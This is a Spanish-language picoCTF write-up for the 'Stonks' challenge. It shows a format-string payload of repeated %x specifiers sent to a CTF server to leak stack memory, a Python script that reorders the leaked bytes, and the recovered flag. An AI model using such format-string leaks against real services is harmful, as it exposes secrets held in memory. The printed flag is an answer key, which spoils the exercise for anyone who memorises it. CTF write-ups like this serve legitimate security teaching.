# Stonks

# Objetivo
I decided to try something noone else has before. I made a bot to automatically trade stonks for me using AI and machine learning. I wouldn't believe you if you told me it's unsecure! [vuln.c](https://mercury.picoctf.net/static/e4d297ce964e4f54225786fe7b153b4b/vuln.c) `nc mercury.picoctf.net 20195`

# Pistas
- Okay, maybe I'd believe you if you find my API key.

# Solución
- Descargamos el codigo fuente
- Vemos que se imprime la api que introducimos sin comillas, por lo que podemos utilizar esto para navegar en la pila
- Vamos probando hasta obtener algo que nos sirva
- Al hacer esto obtenemos un cosigo en hexadecimal
```
┌──(kali㉿kali)-[~/picoctf/binary-explotation/stonks]
└─$ nc mercury.picoctf.net 20195
Welcome back to the trading app!

What would you like to do?
1) Buy some stonks!
2) View my portfolio
1
Using patented AI algorithms to buy stonks
Stonks chosen
What is your API token?
%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x
Buying stonks with token:
9dff3f0804b00080489c3f7f4ad80ffffffff19dfd160f7f58110f7f4adc709dfe18039dff3d09dff3f06f6369707b465443306c5f49345f74356d5f6c6c306d5f795f79336e3534303664303664ff98007df7f85af8f7f584409a07760010f7de7ce9
Portfolio as of Fri May 19 01:30:45 UTC 2023


3 shares of GNQX
12 shares of XY
82 shares of IYI
30 shares of W
34 shares of UBL
65 shares of GK
79 shares of EWY
153 shares of GPL
Goodbye!
                                                                                                                                                                       
┌──(kali㉿kali)-[~/picoctf/binary-explotation/stonks]
└─$ 
```
- Esto lo [convertimos](https://www.rapidtables.com/convert/number/hex-to-ascii.html) a ascii y vemos que parece ser la bandera pero en un formato extraño
```
ÿ?°H?JØÿÿÿñýXJÜpþÿ=	ßóðocip{FTC0l_I4_t5m_ll0m_y_y3n5406d06dÿ}÷øZø÷õ@v÷Þ|é
```
- Identificamos un patrón y le cambiamos el orden con un script en python
```
flag = 'ocip{FTC0l_I4_t5m_ll0m_y_y3n5406d06dÿ^x}'

for i in range(0,len(flag),4):
        print(flag[i+3]+flag[i+2]+flag[i+1]+flag[i], end='')
```
- Con esto imprime la bandera sin el formato extraño
```
┌──(kali㉿kali)-[~/picoctf/binary-explotation/stonks]
└─$ nano exploit.py             
                                                                                                                                                                       
┌──(kali㉿kali)-[~/picoctf/binary-explotation/stonks]
└─$ python exploit.py 
picoCTF{I_l05t_4ll_my_m0n3y_6045d60dTraceback (most recent call last):
  File "/home/kali/picoctf/binary-explotation/stonks/exploit.py", line 4, in <module>
    print(flag[i+3]+flag[i+2]+flag[i+1]+flag[i], end='')
IndexError: string index out of range
                                                                                                                                                                       
┌──(kali㉿kali)-[~/picoctf/binary-explotation/stonks]
└─$
```

# Bandera
picoCTF{I_l05t_4ll_my_m0n3y_6045d60d}

## Notas adicionales
| comando | descripción |
| ------ | ------ |
| xx | xx |

## Referencias
- []()